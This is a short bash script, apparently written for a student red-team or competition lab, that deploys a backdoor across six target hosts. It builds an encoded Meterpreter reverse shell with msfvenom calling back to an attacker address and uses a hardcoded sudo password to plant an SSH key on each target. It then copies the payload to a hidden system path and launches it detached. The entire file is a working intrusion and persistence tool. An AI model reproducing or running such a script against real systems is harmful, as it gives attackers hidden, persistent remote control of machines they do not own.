#!/bin/bash
# Samuel Wizeman
# slw7099@rit.edu

# Attacker's IP address and port number
LHOST="10.0.10.1"  
LPORT="443" 

# Target IP addresses
TARGETS=("10.150.1.5" "10.150.1.6" "10.150.1.7" "10.150.1.8" "10.150.1.9" "10.150.1.10") 

# Where the backdoor will be stored
BACKDOOR_PATH="/usr/local/bin/.hidden_service"
# Username and password for a sudo user
USERNAME='Notch'
PASSWORD='I_H@t3_Th3_Nether@!'

echo "[*] Generating Linux Metasploit payload..."
# Creates a meterpreter reverse shell payload that will be deployed on the target machines
msfvenom -a x64 --platform Linux -p "linux/x64/meterpreter/reverse_tcp" LHOST=$LHOST LPORT=$LPORT -e x64/xor -f elf > backdoor.elf 

# Loops through all of the different target machines
for TARGET in "${TARGETS[@]}"; do
    echo "[*] Deploying to $TARGET..."
    # Copies my public SSH key into the authorized_users file to allow for passwordless ssh
    sshpass -p $PASSWORD ssh-copy-id -i ~/.ssh/id_rsa.pub $USERNAME@$TARGET >/dev/null 2>&1
    # Copies the backdoor onto the target machine
    scp backdoor.elf $USERNAME@$TARGET:/tmp/backdoor
    # Moves the backdoor to a hidden location and makes it its own process.
    ssh $USERNAME@$TARGET "echo $PASSWORD | sudo -S mv /tmp/backdoor $BACKDOOR_PATH && chmod +x $BACKDOOR_PATH && setsid $BACKDOOR_PATH &> /dev/null 2>&1 </dev/null &" &
done

echo "[*] All targets deployed."